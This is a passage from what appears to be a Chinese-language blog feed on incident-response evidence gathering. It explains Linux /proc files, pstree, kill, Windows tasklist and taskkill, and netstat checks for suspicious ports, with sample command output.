0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0ctxt 18957381btime 1622582403processes 127489procs_running 3procs_blocked 0softirq 11692393 15 7686922 29 18488 60735 0 3220 2072535 0 1850449</code></pre><h4 id="swaps"><a href="#swaps" class="headerlink" title="/swaps"></a>/swaps</h4><p>swaps — 当前系统上的交换分区及其空间利用信息，如果有多个交换分区的话，则会每个交换分区的信息分别存储于/proc/swap目录中的单独文件中，而其优先级数字越低，被使用到的可能性越大；下面是作者系统中只有一个交换分区时的输出信息；</p><pre><code>parallels@ubuntu:~/Documents$ cat /proc/swapsFilename                Type        Size        Used        Priority/swapfile                               file        2097148     0       -2</code></pre><h4 id="uptime"><a href="#uptime" class="headerlink" title="/uptime"></a>/uptime</h4><p>uptime — 系统上次启动以来的运行时间，如下所示，其第一个数字表示系统运行时间，第二个数字表示系统空闲时间，单位是秒；</p><pre><code>parallels@ubuntu:~/Documents$ cat /proc/uptime42519.81 50173.72</code></pre><h4 id="version（重点）"><a href="#version（重点）" class="headerlink" title="/version（重点）"></a>/version（重点）</h4><p>version — 当前系统运行的内核版本号，在作者的RHEL5.3上还会显示系统安装的gcc版本，如下所示；</p><pre><code>parallels@ubuntu:~/Documents$ cat /proc/versionLinux version 5.8.0-53-generic (buildd@lcy01-amd64-012) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #60~20.04.1-Ubuntu SMP Thu May 6 09:52:46 UTC 2021</code></pre><h4 id="vmstat"><a href="#vmstat" class="headerlink" title="/vmstat"></a>/vmstat</h4><p>vmstat — 当前系统虚拟内存的多种统计数据，信息量可能会比较大，这因系统而有所不同，可读性较好；下面为作者机器上输出信息的一个片段；（2.6以后的内核支持此文件）</p><pre><code>parallels@ubuntu:~/Documents$ cat /proc/vmstatnr_free_pages 405201nr_zone_inactive_anon 615nr_zone_active_anon 228524nr_zone_inactive_file 119513nr_zone_active_file 177357nr_zone_unevictable 0nr_zone_write_pending 10nr_mlock 0nr_page_table_pages 4200nr_kernel_stack 10048nr_bounce 0nr_zspages 0nr_free_cma 0numa_hit 21836396numa_miss 0numa_foreign 0......</code></pre><h4 id="zoneinfo"><a href="#zoneinfo" class="headerlink" title="/zoneinfo"></a>/zoneinfo</h4><p>zoneinfo — 内存区域（zone）的详细信息列表，信息量较大，下面列出的是一个输出片段：</p><pre><code>parallels@ubuntu:~/Documents$ cat /proc/zoneinfoNode 0, zone      DMA  per-node stats      nr_inactive_anon 615      nr_active_anon 228553      nr_inactive_file 119513      nr_active_file 177369      nr_unevictable 0      nr_slab_reclaimable 25998      nr_slab_unreclaimable 26446      nr_isolated_anon 0      nr_isolated_file 0      workingset_nodes 0      workingset_refault 0      workingset_activate 0      workingset_restore 0      workingset_nodereclaim 0      nr_anon_pages 228265      nr_mapped    61375      nr_file_pages 297792      nr_dirty     11      nr_writeback 0      nr_writeback_temp 0      nr_shmem     911      nr_shmem_hugepages 0      nr_shmem_pmdmapped 0      nr_file_hugepages 0      nr_file_pmdmapped 0      nr_anon_transparent_hugepages 0      nr_vmscan_write 0      nr_vmscan_immediate_reclaim 0      nr_dirtied   420987      nr_written   277592      nr_kernel_misc_reclaimable 0      nr_foll_pin_acquired 0      nr_foll_pin_released 0  pages free     3845        min      67        low      83        high     99        spanned  4095        present  3998        managed  3977        protection: (0, 2652, 3855, 3855, 3855)......</code></pre><h4 id="sys"><a href="#sys" class="headerlink" title="/sys"></a>/sys</h4><p>sys — 目录详解</p><p>与/proc下其它文件的“只读”属性不同的是，管理员可对/proc/sys子目录中的许多文件内容进行修改以更改内核的运行特性，事先可以使用“ls -l”命令查看某文件是否“可写入”。写入操作通常使用类似于“echo DATA &gt; /path/to/your/filename”的格式进行。需要注意的是，即使文件可写，其一般也不可以使用编辑器进行编辑。</p><pre><code>parallels@ubuntu:~/Documents$ ll /proc/systotal 0dr-xr-xr-x   1 root root 0 Jun  1 23:29 ./dr-xr-xr-x 309 root root 0 Jun  1 23:29 ../dr-xr-xr-x   1 root root 0 Jun  2 17:17 abi/dr-xr-xr-x   1 root root 0 Jun  2 17:17 debug/dr-xr-xr-x   1 root root 0 Jun  1 23:29 dev/dr-xr-xr-x   1 root root 0 Jun  1 23:29 fs/dr-xr-xr-x   1 root root 0 Jun  1 23:29 kernel/dr-xr-xr-x   1 root root 0 Jun  1 23:29 net/dr-xr-xr-x   1 root root 0 Jun  2 17:17 user/dr-xr-xr-x   1 root root 0 Jun  1 23:29 vm/</code></pre><p>/proc/sys/debug 子目录</p><p>此目录通常是一空目录；</p><p>/proc/sys/dev 子目录</p><p>为系统上特殊设备提供参数信息文件的目录，其不同设备的信息文件分别存储于不同的子目录中，如大多数系统上都会具有的/proc/sys/dev/cdrom和/proc/sys/dev/raid（如果内核编译时开启了支持raid的功能） 目录，其内存储的通常是系统上cdrom和raid的相关参数信息文件。</p><h3 id="pstree（比较好用）"><a href="#pstree（比较好用）" class="headerlink" title="pstree（比较好用）"></a>pstree（比较好用）</h3><p>相较于/proc查询，pstree的展示更加方便，比ps展示的更加清晰有层次</p><pre><code>pstree [-a] [-c] [-h|-Hpid] [-l] [-n] [-p] [-u] [-G|-U] [pid|user]-a 显示该行程的完整指令及参数, 如果是被记忆体置换出去的行程则会加上括号-c 如果有重覆的行程名, 则分开列出（预设值是会在前面加上 *）-A 各进程树之间的连接以ASCII码字符来连接-U 各进程树之间的连接以utf8字符来连接，某些终端可能会有错误-p 同时列出每个进程的PID-u 同时列出每个进程的所属账号名称(被小括号括起来)特别表明在运行的进程# pstree -apnh //显示进程间的关系同时显示用户名称# pstree -u //显示用户名称</code></pre><p>这里也同样使用多线程程序测试，可以看到pstree展示多线程情况如下</p><pre><code>parallels@ubuntu:~/Documents$ pstree -anph 150666python3,150666 pymutil.py  |-&#123;python3&#125;,150667  `-&#123;python3&#125;,150668</code></pre><h3 id="kill-结束进程）"><a href="#kill-结束进程）" class="headerlink" title="kill (结束进程）"></a>kill (结束进程）</h3><p>kill -9 PID  强制关闭某进程</p><p>kill PID       关闭某进程</p><h2 id="windows下系统进程查询"><a href="#windows下系统进程查询" class="headerlink" title="windows下系统进程查询"></a>windows下系统进程查询</h2><h3 id="tasklist"><a href="#tasklist" class="headerlink" title="tasklist"></a>tasklist</h3><pre><code>  C:\Users\xt&gt;tasklist /?TASKLIST [/S system [/U username [/P [password]]]]         [/M [module] | /SVC | /V] [/FI filter] [/FO format] [/NH]描述:    该工具显示在本地或远程机器上当前运行的进程列表。参数列表:   /S     system           指定连接到的远程系统。（需要远端开启RPC服务，否则无法连接）   /U     [domain\]user    指定应该在哪个用户上下文执行这个命令。   /P     [password]       为提供的用户上下文指定密码。如果省略，则                           提示输入。   /M     [module]         列出当前使用所给 exe/dll 名称的所有任务。                           如果没有指定模块名称，显示所有加载的模块。   /SVC                    显示每个进程中主持的服务。   /APPS 显示 Microsoft Store 应用及其关联的进程。   /V                      显示详细任务信息。   /FI    filter           显示一系列符合筛选器                           指定条件的任务。   /FO    format           指定输出格式。                           有效值: &quot;TABLE&quot;、&quot;LIST&quot;、&quot;CSV&quot;。   /NH                     指定列标题不应该                           在输出中显示。                           只对 &quot;TABLE&quot; 和 &quot;CSV&quot; 格式有效。   /?                      显示此帮助消息。筛选器:    筛选器名称     有效运算符           有效值    -----------     ---------------           --------------------------    STATUS          eq, ne                    RUNNING | SUSPENDED                                              NOT RESPONDING | UNKNOWN    IMAGENAME       eq, ne                    映像名称    PID             eq, ne, gt, lt, ge, le    PID 值    SESSION         eq, ne, gt, lt, ge, le    会话编号    SESSIONNAME     eq, ne                    会话名称    CPUTIME         eq, ne, gt, lt, ge, le    CPU 时间，格式为                                              hh:mm:ss。                                              hh - 小时，                                              mm - 分钟，ss - 秒    MEMUSAGE        eq, ne, gt, lt, ge, le    内存使用(以 KB 为单位)    USERNAME        eq, ne                    用户名，格式为                                              [域\]用户    SERVICES        eq, ne                    服务名称    WINDOWTITLE     eq, ne                    窗口标题    模块         eq, ne                    DLL 名称注意: 当查询远程计算机时，不支持 &quot;WINDOWTITLE&quot; 和 &quot;STATUS&quot;      筛选器。Examples:    TASKLIST    TASKLIST /M dll文件名（不加则导出所有程序及其使用的dll，量很大） 列出所有使用或调用指定dll文件的程序    TASKLIST /V /FO CSV                                      用csv格式输出所有程序详情    TASKLIST /SVC /FO LIST                                   用list格式输出所有程序的服务    TASKLIST /APPS /FI &quot;STATUS eq RUNNING&quot;                   显示所有微软商店相关并且状态为正在运行中的程序    TASKLIST /M wbem*                                                                            显示所有调用wbem开头的dll模块的程序    TASKLIST /S IP /FO LIST    TASKLIST /S IP /U 域\用户名 /FO CSV /NH    TASKLIST /S IP /U username /P password /FO TABLE /NH    TASKLIST /FI &quot;USERNAME ne NT AUTHORITY\SYSTEM&quot; /FI &quot;STATUS eq running&quot;  系统中正在运行的非“SYSTEM“的所有进程    TASKLIST /M user32.dll                                   显示所有使用user32.dll的程序</code></pre><pre><code>C:\Users\xt&gt;tasklist映像名称                       PID 会话名              会话#       内存使用========================= ======== ================ =========== ============System Idle Process              0 Services                   0          8 KSystem                           4 Services                   0         32 KRegistry                        92 Services                   0     60,240 Ksmss.exe                       336 Services                   0        532 Kcsrss.exe                      464 Services                   0      3,664 Kwininit.exe                    568 Services                   0      3,756 Kservices.exe                   700 Services                   0      8,220 Klsass.exe                      720 Services                   0     13,968 Ksvchost.exe                    836 Services                   0     24,472 Kfontdrvhost.exe                868 Services                   0        860 KWUDFHost.exe                   936 Services                   0      1,884 KC:\Users\xt&gt;TASKLIST /M user32.dll映像名称                       PID 模块========================= ======== ============================================lsass.exe                      720 user32.dllsvchost.exe                    836 USER32.dllWUDFHost.exe                   936 USER32.dllsvchost.exe                    432 USER32.dllsvchost.exe                   1044 user32.dllsvchost.exe                   1104 user32.dllsvchost.exe                   1112 user32.dllsvchost.exe                   1236 user32.dllsvchost.exe                   1268 user32.dllC:\Users\xt&gt;TASKLIST /V /FO CSV&quot;映像名称&quot;,&quot;PID&quot;,&quot;会话名      &quot;,&quot;会话#   &quot;,&quot;内存使用 &quot;,&quot;状态  &quot;,&quot;用户名   &quot;,&quot;CPU 时间&quot;,&quot;窗口标题    &quot;&quot;System Idle Process&quot;,&quot;0&quot;,&quot;Services&quot;,&quot;0&quot;,&quot;8 K&quot;,&quot;Unknown&quot;,&quot;NT AUTHORITY\SYSTEM&quot;,&quot;2:29:41&quot;,&quot;暂缺&quot;&quot;System&quot;,&quot;4&quot;,&quot;Services&quot;,&quot;0&quot;,&quot;32 K&quot;,&quot;Unknown&quot;,&quot;暂缺&quot;,&quot;0:20:12&quot;,&quot;暂缺&quot;&quot;Registry&quot;,&quot;92&quot;,&quot;Services&quot;,&quot;0&quot;,&quot;58,972 K&quot;,&quot;Unknown&quot;,&quot;NT AUTHORITY\SYSTEM&quot;,&quot;0:00:03&quot;,&quot;暂缺&quot;&quot;smss.exe&quot;,&quot;336&quot;,&quot;Services&quot;,&quot;0&quot;,&quot;520 K&quot;,&quot;Unknown&quot;,&quot;NT AUTHORITY\SYSTEM&quot;,&quot;0:00:01&quot;,&quot;暂缺&quot;&quot;csrss.exe&quot;,&quot;464&quot;,&quot;Services&quot;,&quot;0&quot;,&quot;3,680 K&quot;,&quot;Unknown&quot;,&quot;NT AUTHORITY\SYSTEM&quot;,&quot;0:00:03&quot;,&quot;暂缺&quot;&quot;wininit.exe&quot;,&quot;568&quot;,&quot;Services&quot;,&quot;0&quot;,&quot;3,724 K&quot;,&quot;Unknown&quot;,&quot;NT AUTHORITY\SYSTEM&quot;,&quot;0:00:00&quot;,&quot;暂缺&quot;......&quot;svchost.exe&quot;,&quot;2208&quot;,&quot;Services&quot;,&quot;0&quot;,&quot;31,984 K&quot;,&quot;Unknown&quot;,&quot;NT AUTHORITY\SYSTEM&quot;,&quot;0:00:01&quot;,&quot;暂缺&quot;&quot;svchost.exe&quot;,&quot;9488&quot;,&quot;Services&quot;,&quot;0&quot;,&quot;8,204 K&quot;,&quot;Unknown&quot;,&quot;NT AUTHORITY\LOCAL SERVICE&quot;,&quot;0:00:00&quot;,&quot;暂缺&quot;&quot;svchost.exe&quot;,&quot;6972&quot;,&quot;Services&quot;,&quot;0&quot;,&quot;11,368 K&quot;,&quot;Unknown&quot;,&quot;NT AUTHORITY\LOCAL SERVICE&quot;,&quot;0:00:00&quot;,&quot;暂缺&quot;&quot;csrss.exe&quot;,&quot;1604&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;5,944 K&quot;,&quot;Running&quot;,&quot;NT AUTHORITY\SYSTEM&quot;,&quot;0:00:01&quot;,&quot;暂缺&quot;&quot;winlogon.exe&quot;,&quot;6448&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;13,628 K&quot;,&quot;Unknown&quot;,&quot;NT AUTHORITY\SYSTEM&quot;,&quot;0:00:00&quot;,&quot;暂缺&quot;&quot;dwm.exe&quot;,&quot;8792&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;139,520 K&quot;,&quot;Running&quot;,&quot;Window Manager\DWM-2&quot;,&quot;0:00:03&quot;,&quot;DWM Notification Window&quot;&quot;fontdrvhost.exe&quot;,&quot;9804&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;14,600 K&quot;,&quot;Unknown&quot;,&quot;Font Driver Host\UMFD-2&quot;,&quot;0:00:00&quot;,&quot;暂缺&quot;&quot;prl_tools.exe&quot;,&quot;9888&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;11,684 K&quot;,&quot;Running&quot;,&quot;NT AUTHORITY\SYSTEM&quot;,&quot;0:00:00&quot;,&quot;暂缺&quot;&quot;coherence.exe&quot;,&quot;2420&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;10,012 K&quot;,&quot;Unknown&quot;,&quot;NT AUTHORITY\SYSTEM&quot;,&quot;0:00:00&quot;,&quot;暂缺&quot;&quot;coherence.exe&quot;,&quot;6608&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;6,064 K&quot;,&quot;Unknown&quot;,&quot;NT AUTHORITY\SYSTEM&quot;,&quot;0:00:00&quot;,&quot;暂缺&quot;&quot;svchost.exe&quot;,&quot;8428&quot;,&quot;Services&quot;,&quot;0&quot;,&quot;5,876 K&quot;,&quot;Unknown&quot;,&quot;NT AUTHORITY\LOCAL SERVICE&quot;,&quot;0:00:00&quot;,&quot;暂缺&quot;&quot;ChsIME.exe&quot;,&quot;3924&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;16,548 K&quot;,&quot;Unknown&quot;,&quot;NT AUTHORITY\SYSTEM&quot;,&quot;0:00:00&quot;,&quot;暂缺&quot;&quot;SangforUDProtect.exe&quot;,&quot;5764&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;9,992 K&quot;,&quot;Running&quot;,&quot;NT AUTHORITY\SYSTEM&quot;,&quot;0:00:00&quot;,&quot;SangforUDProtectExe&quot;&quot;ctfmon.exe&quot;,&quot;8296&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;31,008 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:02&quot;,&quot;暂缺&quot;&quot;sihost.exe&quot;,&quot;9076&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;28,724 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:01&quot;,&quot;暂缺&quot;&quot;svchost.exe&quot;,&quot;7628&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;19,612 K&quot;,&quot;Unknown&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:00&quot;,&quot;暂缺&quot;&quot;svchost.exe&quot;,&quot;8956&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;41,044 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:00&quot;,&quot;Windows Push Notifications Platform&quot;&quot;ChsIME.exe&quot;,&quot;3952&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;8,300 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:00&quot;,&quot;暂缺&quot;&quot;taskhostw.exe&quot;,&quot;1572&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;10,444 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:00&quot;,&quot;Task Host Window&quot;&quot;explorer.exe&quot;,&quot;8916&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;159,660 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:01:01&quot;,&quot;暂缺&quot;&quot;svchost.exe&quot;,&quot;1080&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;22,848 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:00&quot;,&quot;暂缺&quot;&quot;dllhost.exe&quot;,&quot;9608&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;16,576 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:00&quot;,&quot;OleMainThreadWndName&quot;&quot;StartMenuExperienceHost.exe&quot;,&quot;3524&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;77,320 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:01&quot;,&quot;启动&quot;&quot;RuntimeBroker.exe&quot;,&quot;6840&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;26,352 K&quot;,&quot;Unknown&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:01&quot;,&quot;暂缺&quot;&quot;dllhost.exe&quot;,&quot;2996&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;7,596 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:01&quot;,&quot;OleMainThreadWndName&quot;&quot;SearchApp.exe&quot;,&quot;2476&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;164,680 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:06&quot;,&quot;搜索&quot;&quot;RuntimeBroker.exe&quot;,&quot;7692&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;35,440 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:02&quot;,&quot;暂缺&quot;&quot;wpscloudsvr.exe&quot;,&quot;928&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;8,724 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:03&quot;,&quot;暂缺&quot;&quot;prl_cc.exe&quot;,&quot;7980&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;39,768 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:08&quot;,&quot;暂缺&quot;&quot;TextInputHost.exe&quot;,&quot;5760&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;46,064 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:00&quot;,&quot;Microsoft Text Input Application&quot;&quot;RuntimeBroker.exe&quot;,&quot;7776&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;19,536 K&quot;,&quot;Unknown&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:01&quot;,&quot;暂缺&quot;&quot;YourPhone.exe&quot;,&quot;5524&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;49,812 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:00&quot;,&quot;暂缺&quot;&quot;SecurityHealthSystray.exe&quot;,&quot;10668&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;9,600 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:00&quot;,&quot;暂缺&quot;&quot;HipsTray.exe&quot;,&quot;10768&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;26,300 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:01&quot;,&quot;暂缺&quot;&quot;vm3dservice.exe&quot;,&quot;10884&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;6,860 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:00&quot;,&quot;VM3DService Hidden window&quot;&quot;FileOpenBroker64.exe&quot;,&quot;10932&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;8,716 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:00&quot;,&quot;FileOpenBroker64.exe&quot;&quot;AdobeARM.exe&quot;,&quot;11036&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;23,352 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:00&quot;,&quot;Adobe Reader Updater&quot;&quot;WmiPrvSE.exe&quot;,&quot;11184&quot;,&quot;Services&quot;,&quot;0&quot;,&quot;9,044 K&quot;,&quot;Unknown&quot;,&quot;NT AUTHORITY\SYSTEM&quot;,&quot;0:00:00&quot;,&quot;暂缺&quot;&quot;cmd.exe&quot;,&quot;10912&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;4,688 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:00&quot;,&quot;管理员: C:\WINDOWS\system32\cmd.exe - TASKLIST  /V /FO CSV&quot;&quot;conhost.exe&quot;,&quot;2664&quot;,&quot;Console&quot;,&quot;2&quot;,&quot;17,868 K&quot;,&quot;Running&quot;,&quot;DESKTOP-D9ITQNU\xt&quot;,&quot;0:00:05&quot;,&quot;暂缺&quot;C:\Users\xt&gt;TASKLIST /SVC /FO LIST映像名称:     System Idle ProcessPID:          0服务    :     暂缺映像名称:     SystemPID:          4服务    :     暂缺映像名称:     RegistryPID:          92服务    :     暂缺......映像名称:     lsass.exePID:          720服务    :     KeyIso              SamSs              VaultSvc映像名称:     svchost.exePID:          836服务    :     BrokerInfrastructure              DcomLaunch              PlugPlay              Power              SystemEventsBroker映像名称:     fontdrvhost.exePID:          868服务    :     暂缺映像名称:     WUDFHost.exePID:          936服务    :     暂缺......C:\Users\xt&gt;TASKLIST /M wbem*映像名称                       PID 模块========================= ======== ============================================svchost.exe                   3040 wbemcomn.dll, wbemcore.dll, wbemsvc.dll,                                   wbemess.dllWmiPrvSE.exe                  5356 wbemcomn.dll, wbemsvc.dllWmiPrvSE.exe                 11184 wbemcomn.dll, wbemsvc.dllsvchost.exe                   6408 wbemprox.dll, wbemcomn.dll, wbemsvc.dlltasklist.exe                  1896 wbemprox.dll, wbemcomn.dll, wbemsvc.dll</code></pre><h3 id="taskkill-（结束进程）"><a href="#taskkill-（结束进程）" class="headerlink" title="taskkill （结束进程）"></a><strong>taskkill （结束进程）</strong></h3><p>查杀进程</p><p>taskkill /pid 1132（PID）</p><p>taskkill /IM notepad.exe（进程名）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;linux下系统进程查询&quot;&gt;&lt;a href=&quot;#linux下系统进程查询&quot; class=&quot;headerlink&quot; title=&quot;linux下系统进程查询&quot;&gt;&lt;/a&gt;linux下系统进程查询&lt;/h2&gt;&lt;h3 id=&quot;ps&quot;&gt;&lt;a href=&quot;#ps&quot; class=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://xtpeeps.cn/2021/06/04/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E5%BC%82%E5%B8%B8%E7%AB%AF%E5%8F%A3%E6%9F%A5%E8%AF%A2/"/>
    <id>https://xtpeeps.cn/2021/06/04/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E5%BC%82%E5%B8%B8%E7%AB%AF%E5%8F%A3%E6%9F%A5%E8%AF%A2/</id>
    <published>2021-06-03T19:36:52.565Z</published>
    <updated>2021-06-03T19:36:56.862Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux下异常端口-连接检查"><a href="#Linux下异常端口-连接检查" class="headerlink" title="Linux下异常端口/连接检查"></a>Linux下异常端口/连接检查</h2><h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p>菜鸟 <a href="https://www.runoob.com/linux/linux-comm-netstat.html">https://www.runoob.com/linux/linux-comm-netstat.html</a></p><p>使用netstat 网络连接命令，分析可疑端口、IP、PID</p><pre><code>netstat [-acCeFghilMnNoprstuvVwx][-A&lt;网络类型&gt;][--ip]参数说明：-a或--all 显示所有连线中的Socket。-A&lt;网络类型&gt;或--&lt;网络类型&gt; 列出该网络类型连线中的相关地址。-c或--continuous 持续列出网络状态。-C或--cache 显示路由器配置的快取信息。-e或--extend 显示网络其他相关信息。-F或--fib 显示路由缓存。-g或--groups 显示多重广播功能群组组员名单。-h或--help 在线帮助。-i或--interfaces 显示网络界面信息表单。-l或--listening 显示监控中的服务器的Socket。-M或--masquerade 显示伪装的网络连线。-n或--numeric 直接使用IP地址，而不通过域名服务器。-N或--netlink或--symbolic 显示网络硬件外围设备的符号连接名称。-o或--timers 显示计时器。-p或--programs 显示正在使用Socket的程序识别码和程序名称。-r或--route 显示Routing Table。-s或--statistics 显示网络工作信息统计表。-t或--tcp 显示TCP传输协议的连线状况。-u或--udp 显示UDP传输协议的连线状况。-v或--verbose 显示指令执行过程。-V或--version 显示版本信息。-w或--raw 显示RAW传输协议的连线状况。-x或--unix 此参数的效果和指定&quot;-A unix&quot;参数相同。--ip或--inet 此参数的效果和指定&quot;-A inet&quot;参数相同</code></pre><h4 id="常用查询语句"><a href="#常用查询语句" class="headerlink" title="常用查询语句"></a>常用查询语句</h4><pre><code>netstat -antlp|more  监听使用IP显示所有tcp，显示正在使用socket的程序识别码和程序netstat -nu  显示当前户籍UDP连接状况netstat -apu 显示UDP端口号的使用情况netstat -i   显示网卡列表netstat -g   显示组播组的关系netstat -s   显示网络统计信息netstat -l   显示监听的套接口</code></pre><pre><code>parallels@parallels-Parallels-Virtual-Platform:~$ netstat -antlp(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (servers and established)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   tcp6       0      0 ::1:631                 :::*                    LISTEN      -    parallels@parallels-Parallels-Virtual-Platform:~$ netstat -nuActive Internet connections (w/o servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State      udp        0      0 10.211.55.14:40391      10.211.55.1:53          ESTABLISHEDudp        0      0 10.211.55.14:68         10.211.55.1:67          ESTABLISHEDudp        0      0 10.211.55.14:41864      10.211.55.1:53          ESTABLISHEDparallels@parallels-Parallels-Virtual-Platform:~$ netstat -apu(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (servers and established)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    udp        0      0 0.0.0.0:34725           0.0.0.0:*                           -                   udp        0      0 localhost:domain        0.0.0.0:*                           -                   udp        0      0 10.211.55.14:bootpc     10.211.55.1:bootps      ESTABLISHED -                   udp        0      0 0.0.0.0:631             0.0.0.0:*                           -                   udp        0      0 0.0.0.0:mdns            0.0.0.0:*                           -                   udp        0      0 10.211.55.14:41864      10.211.55.1:domain      ESTABLISHED -                   udp        0      0 0.0.0.0:mdns            0.0.0.0:*                           -                   udp6       0      0 [::]:54263              [::]:*                              -                   udp6       0      0 [::]:mdns               [::]:*                              - parallels@parallels-Parallels-Virtual-Platform:~$ netstat -iKernel Interface tableIface      MTU    RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flgenp0s5    1500      517      0      0 0           510      0      0      0 BMRUlo       65536      234      0      0 0           234      0      0      0 LRUparallels@parallels-Parallels-Virtual-Platform:~$ netstat -sIp:    Forwarding: 2    830 total packets received    1 with invalid addresses    0 forwarded    0 incoming packets discarded    827 incoming packets delivered    778 requests sent out    20 outgoing packets droppedIcmp:    42 ICMP messages received    0 input ICMP message failed    ICMP input histogram:        destination unreachable: 42    42 ICMP messages sent    0 ICMP messages failed    ICMP output histogram:        destination unreachable: 42IcmpMsg:        InType3: 42        OutType3: 42Tcp:    22 active connection openings    0 passive connection openings    4 failed connection attempts    2 connection resets received    0 